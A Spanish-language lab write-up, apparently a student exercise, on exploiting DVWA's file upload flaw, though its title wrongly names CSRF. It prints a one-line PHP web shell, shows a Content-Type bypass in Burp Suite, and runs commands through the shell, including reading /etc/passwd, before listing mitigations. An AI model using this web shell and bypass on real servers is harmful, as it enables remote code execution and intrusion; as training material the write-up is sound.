# Falsificación de solicitud entre sitios (CSRF) - DVWA

### 1. Descripción de la Vulnerabilidad
La vulnerabilidad de subida de archivos (File Upload) ocurre cuando una aplicación permite a un usuario cargar archivos al servidor sin validar correctamente su contenido, extensión o tipo MIME. Esto puede permitir a un atacante subir scripts maliciosos (como una Web Shell) para ejecutar código de forma remota (RCE).


#### Desafío Nivel Medium
En este nivel, la aplicación implementa una restricción basada en el MIME type y el tamaño del archivo. El código fuente verifica que:
* El archivo sea una imagen (ej. `image/jpeg` o `image/png`).
* El tamaño no exceda un límite establecido.

### 2. Análisis del Entorno y Explotación
Práctica realizada en un entorno controlado con **Kali Linux** y **VirtualBox**.

#### Identificación de la debilidad
La validación se realiza únicamente en el lado del servidor revisando la cabecera Content-Type de la petición HTTP. Como esta cabecera es enviada por el cliente, puede ser interceptada y modificada antes de que llegue al servidor.

#### Validación del Ataque (Paso a Paso)
Para saltar esta restricción, hemos utilizado herramientas de interceptación (como **Burp Suite** o las herramientas de desarrollador del navegador):
* **Creación del Payload:** Se creó un archivo llamado shell.php con el siguiente contenido para ejecutar comandos:
`<?php echo shell_exec($_GET['cmd']); ?>`
<img width="328" height="78" alt="image" src="https://github.com/user-attachments/assets/52e91ffb-02a5-4d5b-9492-34093da9c0db" />

* **Interceptación:** Al intentar subir shell.php, el servidor lo rechaza porque el Content-Type es application/x-php.
<img width="578" height="216" alt="image" src="https://github.com/user-attachments/assets/1b43dc61-f983-4179-913a-004f1fb669e9" />

* **Manipulación:**
  * Se abre BurpSuite y se accede a Proxy, seleccionamos la opción Open browser y una vez se abre el navegador nos dirigimos a la página web donde vamos a proceder con el ataque y preparamos nuestro archivo shell.php sin subirlo:

<img width="578" height="216" alt="image" src="https://github.com/user-attachments/assets/ccb871de-63cf-4667-b066-16e32dcfb221" />

  * A continuación nos dirigimos a Burpsuite,habilitamos la interceptación del proxy y ahora sí puslamos Upload, veremos como Burpsuite lo ha interceptado correctamente:

<img width="618" height="195" alt="image" src="https://github.com/user-attachments/assets/fe4214a4-896b-44b5-b46f-3e83162fe53f" />

  * Finalmente inspeccionamos la petición y cambiamos manualmente el `Content-Type` a `image/jpeg`.

<img width="525" height="126" alt="image" src="https://github.com/user-attachments/assets/b36eb5f2-6872-49fa-8f8e-80fa5a5c98fb" />


<img width="525" height="126" alt="image" src="https://github.com/user-attachments/assets/96f07df7-c0eb-4ba5-aa44-755bacc68f84" />

  * Tras esto envíamos la petición modificada y podremos visualizar el siguiente mensaje de validación en el navegador: 


<img width="831" height="478" alt="image" src="https://github.com/user-attachments/assets/23f87e01-8ff4-4346-b03f-ce91ec077483" />

* **Ejecución:** El servidor acepta el archivo creyendo que es una imagen.

| Archivo Subido | Tipo Real   | Tipo MIME Falsificado | Resultado             |
|----------------|------------|----------------------|-----------------------|
| shell.php      | PHP Script | image/jpeg           | Éxito (Uploaded)      |

#### Extracción de Información Crítica
Una vez subida la shell, accedemos a la ruta del archivo y ejecutamos comandos mediante el parámetro `cmd`:
* **Lectura de usuarios:** `.../uploads/shell.php?cmd=cat /etc/passwd`
<img width="1048" height="538" alt="image" src="https://github.com/user-attachments/assets/a577b28e-1c06-4155-ba82-e1e6dc9093fc" />

* **Ubicación:** `.../uploads/shell.php?cmd=pwd`
<img width="524" height="126" alt="image" src="https://github.com/user-attachments/assets/b6ba2ad1-cac2-4e53-b3f5-ede90ec32556" />

### 3. Mitigación y Buenas Prácticas (RA3)
Para corregir esta vulnerabilidad y asegurar una puesta en producción segura:
* **Renombrado de archivos:** Cambiar el nombre de los archivos subidos a un hash aleatorio y eliminar la extensión original.
* **Validación de contenido real:** No confiar en el MIME type; usar funciones que analicen el contenido real del archivo (ej. `getimagesize()` en PHP).
* **Deshabilitar ejecución:** Configurar el servidor web para que no ejecute scripts en la carpeta de `/uploads`.
* **Almacenamiento externo:** Guardar los archivos fuera del directorio raíz de la web o en un servicio de almacenamiento aislado.

